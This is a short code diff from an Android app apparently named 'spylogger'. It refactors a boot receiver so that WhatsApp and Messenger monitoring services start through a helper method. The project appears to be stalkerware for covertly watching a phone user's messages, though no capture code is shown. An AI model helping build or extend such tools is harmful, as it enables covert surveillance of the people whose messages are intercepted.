@@ -7,8 +7,7 @@ import android.content.Intent;
 import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
-import com.gravatasufoca.spylogger.services.MessengerService;
-import com.gravatasufoca.spylogger.services.WhatsAppService;
+import com.gravatasufoca.spylogger.utils.Utils;
 
 import java.sql.SQLException;
 
@@ -22,19 +21,7 @@ public class BootStarter extends BroadcastReceiver {
 			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
 
 			Configuracao configuracao= repositorioConfiguracao.getConfiguracao();
-			boolean check=false;
-			if(configuracao.isWhatsApp()){
-				Intent myIntent = new Intent(context, WhatsAppService.class);
-				context.startService(myIntent);
-				check=true;
-			}
-
-			if(configuracao.isFacebook()){
-				Intent myIntent = new Intent(context, MessengerService.class);
-				context.startService(myIntent);
-				check=true;
-			}
-
+			Utils.startNewService(context,configuracao);
 
 
 		} catch (SQLException e) {
